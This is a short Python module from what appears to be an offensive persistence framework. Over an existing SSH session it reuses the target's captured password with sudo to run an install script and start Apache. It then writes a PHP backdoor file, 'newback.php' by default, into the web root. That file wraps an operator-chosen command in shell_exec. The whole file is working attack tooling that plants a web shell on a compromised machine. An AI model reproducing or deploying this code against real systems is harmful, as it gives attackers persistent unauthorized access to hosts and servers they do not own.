from module import *

class WebMod(Module):

    def __init__(self, target, command, core):
        self.core = core
        self.target = target
        self.name = "Web"
        self.command = command
        self.options = {
            "location" : Option("name", "newback.php", "location of file", False)
        }
    
    
    def exploit(self, command):
        location = self.get_value("location")
        
        self.target.scpFiles(self, "web/install.sh", False)
        self.target.ssh.exec_command("echo " + self.target.pword + " | sudo -S bash install.sh")
        print("Starting Apache server.")

        self.target.ssh.exec_command("echo " + self.target.pword + " | sudo -S echo \'shell_exec(\"" + command + "\")\' > /var/www/html/" + location)
        print(GOOD + self.name + " module success") 
